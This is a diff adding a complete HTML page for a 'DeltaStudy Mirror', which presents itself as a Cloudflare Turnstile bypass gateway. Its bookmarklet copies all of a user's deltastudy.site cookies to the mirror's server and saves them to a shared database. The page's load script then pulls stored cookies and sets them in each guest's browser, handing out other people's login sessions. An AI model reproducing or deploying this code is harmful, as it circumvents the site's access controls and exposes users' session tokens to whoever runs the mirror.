@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DeltaStudy Mirror - Session Verification</title>
+  
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  
+  <script>
+    // Automatic background authentication for guests
+    (async function() {
+      try {
+        const nextUrl = new URLSearchParams(window.location.search).get('next') || '/';
+        
+        if (window.location.search.includes('cookies=')) {
+          return;
+        }
+        
+        const res = await fetch('/api/get-tokens');
+        const data = await res.json();
+        if (data && data.cookies) {
+          const cookiePairs = data.cookies.split(';');
+          let cookiesSetCount = 0;
+          cookiePairs.forEach(pair => {
+            const trimPair = pair.trim();
+            if (!trimPair) return;
+            const eqIndex = trimPair.indexOf('=');
+            if (eqIndex === -1) return;
+            const name = trimPair.substring(0, eqIndex).trim();
+            const value = trimPair.substring(eqIndex + 1).trim();
+            if (name && value) {
+              const expires = new Date();
+              expires.setTime(expires.getTime() + (30 * 24 * 60 * 60 * 1000)); // 30 days
+              document.cookie = `${name}=${value}; expires=${expires.toUTCString()}; path=/; Secure; SameSite=Lax`;
+              cookiesSetCount++;
+            }
+          });
+          
+          if (cookiesSetCount > 0) {
+            window.location.href = nextUrl;
+            return;
+          }
+        }
+      } catch (e) {
+        console.error("Auto authentication failed:", e);
+      }
+      
+      window.addEventListener('DOMContentLoaded', () => {
+        const overlay = document.getElementById('loading-overlay');
+        if (overlay) overlay.style.display = 'none';
+      });
+    })();
+  </script>
+
+  <style>
+    :root {
+      --bg-color: #050816;
+      --card-bg: rgba(255, 255, 255, 0.03);
+      --card-border: rgba(255, 255, 255, 0.08);
+      --primary: #6366f1; /* Indigo */
+      --primary-glow: rgba(99, 102, 241, 0.15);
+      --secondary: #10b981;
+      --secondary-glow: rgba(16, 185, 129, 0.15);
+      --text-main: #f3f4f6;
+      --text-muted: #9ca3af;
+      --text-dark: #6b7280;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Outfit', sans-serif;
+    }
+
+    body {
+      background-color: var(--bg-color);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow-x: hidden;
+      position: relative;
+      padding: 20px 0;
+    }
+
+    .glow-bg {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .glow-1 {
+      position: absolute;
+      left: 50%;
+      top: -140px;
+      height: 360px;
+      width: 360px;
+      transform: translateX(-50%);
+      border-radius: 50%;
+      background: var(--primary-glow);
+      filter: blur(100px);
+    }
+
+    .glow-2 {
+      position: absolute;
+      bottom: -160px;
+      right: -120px;
+      height: 360px;
+      width: 360px;
+      border-radius: 50%;
+      background: var(--secondary-glow);
+      filter: blur(100px);
+    }
+
+    .grid-overlay {
+      position: absolute;
+      inset: 0;
+      opacity: 0.02;
+      background-image: 
+        linear-gradient(to right, white 1px, transparent 1px),
+        linear-gradient(to bottom, white 1px, transparent 1px);
+      background-size: 34px 34px;
+      z-index: 0;
+    }
+
+    .container {
+      position: relative;
+      z-index: 10;
+      width: 100%;
+      max-width: 550px;
+      padding: 20px;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 24px;
+      padding: 30px;
+      backdrop-filter: blur(20px);
+      box-shadow: 0 24px 90px rgba(0, 0, 0, 0.6);
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 15px auto;
+      height: 60px;
+      width: 60px;
+      border-radius: 18px;
+      background: #ffffff;
+      color: #050816;
+      box-shadow: 0 10px 30px rgba(255, 255, 255, 0.1);
+      font-size: 28px;
+      font-weight: 900;
+    }
+
+    .title {
+      font-size: 28px;
+      font-weight: 800;
+      letter-spacing: -0.025em;
+      margin-bottom: 6px;
+      background: linear-gradient(to right, #ffffff, #d1d5db);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: var(--text-muted);
+    }
+
+    .steps {
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+
+    .step-item {
+      background: rgba(255, 255, 255, 0.01);
+      border: 1px solid rgba(255, 255, 255, 0.03);
+      border-radius: 16px;
+      padding: 16px;
+    }
+
+    .step-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 8px;
+    }
+
+    .step-number {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 22px;
+      width: 22px;
+      border-radius: 50%;
+      background: var(--primary);
+      color: white;
+      font-size: 11px;
+      font-weight: 700;
+    }
+
+    .step-title {
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .step-desc {
+      font-size: 13px;
+      color: var(--text-muted);
+      line-height: 1.5;
+      padding-left: 32px;
+    }
+
+    .step-desc a {
+      color: var(--primary);
+      text-decoration: none;
+      font-weight: 600;
+      border-bottom: 1px dashed var(--primary);
+    }
+
+    .bookmarklet-container {
+      display: flex;
+      justify-content: center;
+      margin: 15px 0 5px 0;
+    }
+
+    .bookmarklet-btn {
+      display: inline-block;
+      background: linear-gradient(135deg, #4f46e5, var(--primary));
+      color: white;
+      padding: 10px 20px;
+      border-radius: 12px;
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 13px;
+      box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3);
+      cursor: move;
+      transition: all 0.2s;
+    }
+
+    .alert {
+      display: none;
+      margin-top: 15px;
+      padding: 12px 16px;
+      border-radius: 12px;
+      font-size: 13px;
+      line-height: 1.4;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .alert-error {
+      background: rgba(239, 68, 68, 0.1);
+      border: 1px solid rgba(239, 68, 68, 0.2);
+      color: #fca5a5;
+    }
+
+    .alert-success {
+      background: rgba(16, 185, 129, 0.1);
+      border: 1px solid rgba(16, 185, 129, 0.2);
+      color: #a7f3d0;
+    }
+
+    .alert-info {
+      background: rgba(99, 102, 241, 0.1);
+      border: 1px solid rgba(99, 102, 241, 0.2);
+      color: #c7d2fe;
+      display: flex;
+    }
+
+    .spinner {
+      border: 3px solid rgba(255, 255, 255, 0.1);
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      border-left-color: var(--primary);
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .footer-text {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 12px;
+      color: var(--text-dark);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Loading Overlay -->
+  <div id="loading-overlay" style="position: fixed; inset: 0; background: #050816; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 20px;">
+    <div class="logo-container" style="margin: 0;">Δ</div>
+    <div class="spinner"></div>
+    <div style="color: #9ca3af; font-family: 'Outfit', sans-serif; font-size: 14px; font-weight: 500;">Securing your connection to DeltaStudy...</div>
+  </div>
+
+  <div class="glow-bg">
+    <div class="glow-1"></div>
+    <div class="glow-2"></div>
+    <div class="grid-overlay"></div>
+  </div>
+
+  <div class="container">
+    <div class="card">
+      
+      <div class="header">
+        <div class="logo-container">Δ</div>
+        <h1 class="title">DeltaStudy Mirror</h1>
+        <p class="subtitle">Cloudflare Turnstile Bypass Gateway</p>
+      </div>
+
+      <div class="alert alert-info" style="margin-bottom: 20px;">
+        <strong>Bypass Verification:</strong> Use this bookmarklet to sync your cookies to the database if the automatic background solver experiences any delay.
+      </div>
+      
+      <div class="steps">
+        <div class="step-item">
+          <div class="step-header">
+            <div class="step-number">1</div>
+            <div class="step-title">Install Bookmarklet</div>
+          </div>
+          <div class="step-desc">
+            Drag the button below into your browser's <strong>Bookmarks Bar</strong>:
+            <div class="bookmarklet-container">
+              <a class="bookmarklet-btn" id="bookmarklet-link" href="#">
+                Sync DeltaStudy Cookie
+              </a>
+            </div>
+          </div>
+        </div>
+
+        <div class="step-item">
+          <div class="step-header">
+            <div class="step-number">2</div>
+            <div class="step-title">Solve & Sync</div>
+          </div>
+          <div class="step-desc">
+            Go to <a href="https://deltastudy.site/" target="_blank">deltastudy.site</a>, solve the Turnstile check, and click the bookmarklet in your bookmarks bar.
+          </div>
+        </div>
+      </div>
+
+      <!-- Alerts -->
+      <div class="alert alert-error" id="errorAlert"></div>
+      <div class="alert alert-success" id="successAlert">Verification successful! Redirecting...</div>
+
+    </div>
+    
+    <p class="footer-text">Protected by Cloudflare Bypass Tunnel</p>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const bookmarkletLink = document.getElementById('bookmarklet-link');
+      if (bookmarkletLink) {
+        const origin = window.location.origin;
+        bookmarkletLink.href = `javascript:(function(){var%20c=document.cookie;var%20n=window.location.pathname+window.location.search;window.location.href='${origin}/verify?cookies='+encodeURIComponent(c)+'&next='+encodeURIComponent(n);})();`;
+      }
+
+      // Process callback from Bookmarklet
+      const urlParams = new URLSearchParams(window.location.search);
+      const encodedCookies = urlParams.get('cookies');
+      const nextUrl = urlParams.get('next') || '/';
+      const errorAlert = document.getElementById('errorAlert');
+      const successAlert = document.getElementById('successAlert');
+
+      if (encodedCookies) {
+        const overlay = document.getElementById('loading-overlay');
+        if (overlay) overlay.style.display = 'flex';
+
+        try {
+          const cookiesStr = decodeURIComponent(encodedCookies);
+          
+          // 1. Set cookies locally
+          const cookiePairs = cookiesStr.split(';');
+          cookiePairs.forEach(pair => {
+            const trimPair = pair.trim();
+            if (!trimPair) return;
+            const eqIndex = trimPair.indexOf('=');
+            if (eqIndex === -1) return;
+            const name = trimPair.substring(0, eqIndex).trim();
+            const value = trimPair.substring(eqIndex + 1).trim();
+            if (name && value) {
+              const expires = new Date();
+              expires.setTime(expires.getTime() + (30 * 24 * 60 * 60 * 1000));
+              document.cookie = `${name}=${value}; expires=${expires.toUTCString()}; path=/; Secure; SameSite=Lax`;
+            }
+          });
+
+          // 2. Upload to Vercel KV
+          fetch('/api/save-tokens', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cookies: cookiesStr })
+          })
+          .then(res => res.json())
+          .then(data => {
+            if (data.success) {
+              successAlert.style.display = 'flex';
+              setTimeout(() => {
+                window.location.href = nextUrl;
+              }, 1200);
+            } else {
+              throw new Error(data.error || 'Failed to save to database.');
+            }
+          })
+          .catch(err => {
+            if (overlay) overlay.style.display = 'none';
+            errorAlert.innerText = `Saved cookies locally, but failed to sync to database: ${err.message}`;
+            errorAlert.style.display = 'flex';
+          });
+
+        } catch (err) {
+          if (overlay) overlay.style.display = 'none';
+          errorAlert.innerText = `Failed to process cookies: ${err.message}`;
+          errorAlert.style.display = 'flex';
+        }
+      }
+    });
+  </script>
+</body>
+</html>
